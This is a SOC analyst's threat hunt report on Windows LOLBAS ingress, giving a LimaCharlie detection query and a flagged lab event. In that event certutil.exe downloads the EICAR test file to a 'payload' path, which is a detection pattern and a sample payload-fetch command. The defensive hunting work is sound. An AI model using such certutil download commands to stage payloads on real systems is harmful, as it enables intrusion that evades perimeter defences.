# Proactive Threat Hunt: HUNT-001

* **Hunt Title:** Discovery of LOLBAS Ingress and Staging Activity
* **Author:** Dil Mahmud Khan (SOC Tier-1 Analyst)
* **Date Conducted:** 2026-09-22
* **Target Environment:** Windows 10/11 Enterprise Workstations
* **Framework:** MITRE ATT&CK [T1105 (Ingress Tool Transfer)](https://attack.mitre.org/techniques/T1105/) & [T1218 (System Binary Proxy Execution)](https://attack.mitre.org/techniques/T1218/)

---

## 1. Hunt Hypothesis

> *"Adversaries are actively utilizing native, trusted Windows administrative binaries (specifically `certutil.exe`, `bitsadmin.exe`, and `curl.exe`) to download external scripts and payloads, bypassing basic perimeter firewall alerts."*

---

## 2. Telemetry & Data Sources Searched

* **Log Source:** LimaCharlie EDR Process Creation Events (`NEW_PROCESS`).
* **Attributes Analyzed:**
  * `event/FILE_PATH` (Executable binary path)
  * `event/COMMAND_LINE` (Complete execution arguments)
  * `event/PARENT/FILE_PATH` (Spawning parent binary)
  * `event/NETWORK_CONNECTIONS` (Outbound TCP sockets on port 80/443)

---

## 3. Threat Hunting Query (EDR Telemetry)

In the LimaCharlie Sensor Timeline search:
```text
event.FILE_PATH:*certutil.exe AND (event.COMMAND_LINE:*urlcache* OR event.COMMAND_LINE:*split*)
```

---

## 4. Hunting Analysis & Observations

1. **Baseline Activity:**  
   During normal operations, `certutil.exe` executes on domain endpoints approximately 1–2 times per week, typically invoked by group policy to refresh certificate revocation lists (CRLs) without `-split` or `-f` flags.
2. **Anomalous Finding:**  
   The hunt query flagged an event on endpoint `WIN10-ENT-LAB` where `cmd.exe` spawned:
   `certutil.exe -urlcache -split -f https://secure.eicar.org/eicar.com C:\LabAttacks\payload_certutil.tmp`
3. **Correlation:**  
   Correlated network sockets showed outbound HTTPS connection directly to `89.238.73.97:443`, followed by file creation in `C:\LabAttacks\`.

---

## 5. Outcome & Continuous Improvement

* **Incident Escalation:** Handed findings over to incident triage (Incident ID: `INC-2026-001`).
* **Detection Gap Closed:** This hunt confirmed that baseline endpoint security was not blocking LOLBAS downloads. As a result, we authored and deployed the custom D&R rule `lolbas_certutil.yaml` to ensure any future occurrence automatically triggers our Tines SOAR containment pipeline.
